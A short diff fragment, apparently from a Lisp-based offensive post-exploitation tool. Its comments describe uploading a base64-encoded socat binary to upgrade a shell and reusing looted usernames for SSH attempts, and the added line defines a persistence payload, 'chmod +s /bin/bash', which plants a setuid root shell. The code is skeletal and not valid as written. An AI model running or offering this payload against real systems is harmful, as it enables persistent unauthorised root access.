@@ -22,4 +22,5 @@
 (defvar upgrade-shell) ;; uploads base64 encoded socat binary
 (defvar callback  "") ;; Parse Loot file for username, try to ssh using it and notif on success
 
-(defun privilege-esc)
+(defun privilege)
+(defun privilege-persistence-payload "chmod +s /bin/bash")
